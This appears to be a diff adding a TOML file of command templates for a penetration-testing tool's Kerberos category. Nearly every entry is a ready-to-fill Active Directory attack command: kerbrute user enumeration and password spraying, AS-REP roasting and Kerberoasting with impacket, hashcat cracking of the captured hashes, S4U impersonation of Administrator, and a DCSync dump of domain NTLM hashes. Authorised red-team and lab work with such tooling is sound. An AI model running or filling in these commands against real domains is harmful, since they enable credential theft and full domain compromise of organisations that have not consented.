@@ -1,0 +1,86 @@
+category = "kerberos"
+display_name = "Kerberos"
+icon = ""
+order = 35
+
+[[command]]
+id = "krb.kerbrute.userenum"
+title = "kerbrute userenum (no creds)"
+template = "kerbrute userenum -d {domain} --dc {dc} /opt/wordlists/jsmith.txt"
+requires = ["kerbrute"]
+tags = ["unauth", "users"]
+when = "target.has_dc"
+
+[[command]]
+id = "krb.kerbrute.passwordspray"
+title = "kerbrute passwordspray"
+template = "kerbrute passwordspray -d {domain} --dc {dc} users.txt 'Spring2025!'"
+requires = ["kerbrute"]
+tags = ["spray", "noisy"]
+when = "target.has_dc"
+
+[[command]]
+id = "krb.impacket.asreproast"
+title = "impacket-GetNPUsers (AS-REP roast)"
+template = "impacket-GetNPUsers {domain}/ -usersfile users.txt -no-pass -dc-ip {dc} -format hashcat -outputfile asrep.hashes"
+requires = ["impacket-GetNPUsers"]
+tags = ["asrep", "roast"]
+when = "target.has_dc"
+
+[[command]]
+id = "krb.impacket.kerberoast"
+title = "impacket-GetUserSPNs (Kerberoast)"
+template = "impacket-GetUserSPNs '{domain}/{user}:{password}' -dc-ip {dc} -request -outputfile spn.hashes"
+requires = ["impacket-GetUserSPNs"]
+tags = ["kerberoast", "spn"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "krb.hashcat.asrep"
+title = "hashcat AS-REP (m 18200)"
+template = "hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt"
+requires = ["hashcat"]
+tags = ["crack", "asrep"]
+
+[[command]]
+id = "krb.hashcat.tgs"
+title = "hashcat Kerberoast TGS (m 13100)"
+template = "hashcat -m 13100 spn.hashes /usr/share/wordlists/rockyou.txt"
+requires = ["hashcat"]
+tags = ["crack", "kerberoast"]
+
+[[command]]
+id = "krb.impacket.s4u"
+title = "impacket-getST (S4U / constrained delegation)"
+template = "impacket-getST -spn 'cifs/{dc}' -impersonate Administrator '{domain}/{user}:{password}' -dc-ip {dc}"
+requires = ["impacket-getST"]
+tags = ["delegation", "s4u"]
+when = "creds.kind == 'plaintext'"
+
+[[command]]
+id = "krb.impacket.dcsync"
+title = "impacket-secretsdump — DCSync"
+template = "impacket-secretsdump '{user_at_domain}':'{password}'@{dc} -just-dc-ntlm -outputfile dcsync"
+requires = ["impacket-secretsdump"]
+tags = ["dcsync", "dump"]
+when = "creds.kind == 'plaintext' and target.has_dc"
+
+[[command]]
+id = "krb.tickets.list"
+title = "klist (show current cache)"
+template = "klist"
+requires = ["klist"]
+tags = ["tickets"]
+
+[[command]]
+id = "krb.tickets.kinit"
+title = "kinit (acquire TGT from password)"
+template = "kinit {user}@{domain}"
+requires = ["kinit"]
+tags = ["tickets"]
+
+[[command]]
+id = "krb.tickets.use_ccache"
+title = "export KRB5CCNAME"
+template = "export KRB5CCNAME=/tmp/{user}.ccache && klist"
+tags = ["tickets"]
